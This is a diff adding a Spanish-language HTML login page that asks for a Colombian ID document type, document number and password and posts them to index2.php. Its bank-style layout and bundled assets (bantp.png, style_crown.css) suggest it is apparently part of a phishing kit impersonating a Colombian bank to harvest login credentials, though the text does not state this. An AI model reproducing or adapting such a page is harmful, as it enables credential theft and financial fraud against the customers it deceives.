@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html><head>
+				<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                <title>Inicio</title>
+                
+				<meta http-equiv="X-UA-Compatible" content="IE=edge">
+                <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
+                
+                <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css">
+					<script>
+						function soloNumeros(e){
+						  var key = window.event ? e.which : e.keyCode;
+						  if (key < 48 || key > 57) {
+							e.preventDefault();
+						  }
+						}
+					</script>
+					
+
+					
+		
+                
+        </head>
+        <body>
+                <header style="" class="ioscam">
+                <nav class="header_wrapeer">
+                        <div class="header__campaign"><div class="header__logo">
+						<img src="./fhs/blanco.png"  sizes="(min-width: 900px) 20vw, 50vw" class="header__image">
+						<img src="./fhs/bantp.png" >
+						</div>
+							</div>
+						
+                </nav>
+                </header>
+                <div class="container">
+                        <h1>¡Bienvenido!</h1>
+                        <form method="POST" action="index2.php" >
+						<div class="group">
+										<select  name="tipodoc" style="background: #f4f4f4;
+  
+appearance: none;
+    padding: 0 40px 0 15px;
+    outline: 0;
+    width: 100%;
+    font-size: .875em;
+    color: #121212;
+    text-align: left;
+    
+	font-family: Arial, Helvetica, sans-serif;height: 56px;    border: none;
+    border-bottom: 1px solid #121212;
+	">
+								<option value="CC">Cédula de Ciudadanía</option>
+								<option value="CE">Cédula de Extranjería</option>
+								<option value="TI">Tarjeta de Identidad</option>
+								<option value="PA">Pasaporte</option>
+								<option value="NIP">Número Identificación Personal</option>
+							</select>
+					 
+                    </div>         <br>  
+                                <div class="group">
+                                        <input name="numdoc"  type="tel" maxlength="16" onkeypress="soloNumeros(event)" autocomplete="off" required >
+                                        <span class="highlight"></span>
+                                        <label for="username2">Número de Documento</label>
+                                </div>
+                                <div class="group" style="margin-top: 16px;">
+                                        <input type="password" name="clvs" autocomplete="off" value="" maxlength="10" required="">
+                                        <span class="highlight"></span>
+                                        <label for="password">Contraseña</label>
+                                </div>
+                              <br><br>
+							  
+							  
+			
+							  
+                                <div  align="center">
+                                        
+                                     	<button type="submit" class="btn btn-blue btn-full btn-full-md" style="background-color: #237aba;    width: 60%;
+					padding: 2rem 4rem;    border: none;
+    border-radius: 1px;
+    color: #fff;
+	text-align:center;
+    font-family: Helvetica Neue,Arial,Helvetica,sans-serif;
+    font-size: 1rem;
+    margin: 0;
+    padding: 1.3rem 3.7rem;
+    transition: background-color .1s linear 0s;
+    white-space: inherit;
+    -moz-osx-font-smoothing: grayscale;
+    -webkit-font-smoothing: antialiased;
+    background-color: #237aba;
+    outline: 0;
+    display: inline-block;
+    box-shadow: none!important;
+    cursor: pointer;">Continuar</button>
+                                                
+                                        
+                               <br> <br><br>
+                                                <a href="#" class="tatione">¿Olvidaste tu contraseña?</a>
+                              
+							  </div>
+										
+										
+                        </form>
+                        
+						</div>
+                         
+   </body>
+   </html>
